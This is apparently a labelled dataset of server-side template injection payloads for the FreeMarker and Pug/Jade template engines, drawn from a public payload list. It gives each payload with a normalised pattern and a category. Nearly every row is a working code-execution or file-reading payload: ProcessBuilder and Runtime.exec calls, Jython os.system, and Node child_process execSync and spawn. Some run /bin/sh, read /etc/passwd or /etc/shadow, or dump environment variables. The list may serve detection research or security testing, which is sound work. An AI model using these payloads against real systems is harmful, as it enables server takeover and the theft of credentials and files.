"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""powershell"",""-c"",""whoami""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.Runtime"").getRuntime().exec(""id"")}","${value(""S"").getruntime().exec(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.Runtime"").getRuntime().exec(""whoami"")}","${value(""S"").getruntime().exec(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.Runtime"").getRuntime().exec(""cat /etc/passwd"")}","${value(""S"").getruntime().exec(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(request.getParameter(""cmd""))}","${""S""?new()(request.getparameter(""S""))}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(request.getParameter(""cmd""))}","${ex(request.getparameter(""S""))}",java,FreeMarker,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${ex(.data_model.cmd)},${ex(.data_model.cmd)},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().exec(""import os;os.system('id')"")}","${""S""?new().exec(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().eval(""__import__('os').system('id')"")}","${""S""?new().eval(""S"")}",java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${jython.exec(""import os;os.system('id')"")}","${jython.exec(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${jython.eval(""__import__('os').system('id')"")}","${jython.eval(""S"")}",java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#setting url_escaping_charset=""UTF-8"">","<#settingurl_escaping_charset=""S"">",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#setting output_encoding=""UTF-8"">","<#settingoutput_encoding=""S"">",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
#{7*'7'},#{N*'S'},javascript,Pug/Jade,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global},#{global},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process},#{process},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root},#{root},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{self},#{self},javascript,Pug/Jade,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process},#{global.process},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule},#{process.mainmodule},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require},#{process.mainmodule.require},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process')},#{process.mainmodule.require('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('id')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('whoami')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('cat /etc/passwd')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('ls -la')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('uname -a')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('pwd')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('env')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('cat flag.txt')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('ps aux')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('ifconfig')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('netstat -an')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('cat /etc/shadow')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('whoami').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('ls -la').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('uname -a').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('pwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('env').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat flag.txt').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawnSync('id').stdout.toString()},#{process.mainmodule.require('S').spawnsync('S').stdout.tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawnSync('whoami').stdout.toString()},#{process.mainmodule.require('S').spawnsync('S').stdout.tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('ls',['-la']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('uname',['-a']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('id').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('whoami').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('ls -la').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}","#{process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','whoami'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}","#{process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','cat /etc/passwd'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}","#{process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env},#{process.env},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.PATH},#{process.env.path},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.HOME},#{process.env.home},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.USER},#{process.env.user},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.SHELL},#{process.env.shell},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.version},#{process.version},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.versions},#{process.versions},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.platform},#{process.platform},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.arch},#{process.arch},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.release},#{process.release},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.config},#{process.config},javascript,Pug/Jade,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.pid},#{process.pid},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.ppid},#{process.ppid},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.cwd()},#{process.cwd()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.execPath},#{process.execpath},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.argv},#{process.argv},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.execArgv},#{process.execargv},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.memoryUsage()},#{process.memoryusage()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.uptime()},#{process.uptime()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.env},#{global.process.env},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.version},#{global.process.version},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.platform},#{global.process.platform},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.cwd()},#{global.process.cwd()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process},#{root.process},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process.mainModule},#{root.process.mainmodule},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process.mainModule.require},#{root.process.mainmodule.require},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process.mainModule.require('child_process').execSync('id').toString()},#{root.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{global.process.mainModule.require('child_process').execSync('id').toString()},!{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('whoami').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('ls -la').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('uname -a').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('pwd').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('env').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('cat flag.txt').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}","#{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('fs').readFileSync('flag.txt','utf8')}","#{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('fs').readdirSync('/')},#{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('fs').readdirSync('.')},#{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}","!{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{process.mainModule.require('fs').readFileSync('flag.txt','utf8')}","!{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('fs').readdirSync('/')},!{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('fs').readdirSync('.')},!{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}","#{global.process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{global.process.mainModule.require('fs').readFileSync('flag.txt','utf8')}","#{global.process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('fs').readdirSync('/')},#{global.process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('child_process').execSync('id').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('child_process').execSync('whoami').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('child_process').execSync('ls -la').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8')}","#{process.mainmodule.constructor._load('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.constructor._load('fs').readFileSync('flag.txt','utf8')}","#{process.mainmodule.constructor._load('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('fs').readdirSync('/')},#{process.mainmodule.constructor._load('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.constructor._load('child_process').execSync('id').toString()},!{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.constructor._load('child_process').execSync('whoami').toString()},!{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8')}","!{process.mainmodule.constructor._load('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawn('id')},#{process.mainmodule.require('S').spawn('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawn('whoami')},#{process.mainmodule.require('S').spawn('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawn('cat',['/etc/passwd'])}","#{process.mainmodule.require('S').spawn('S',['S'])}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
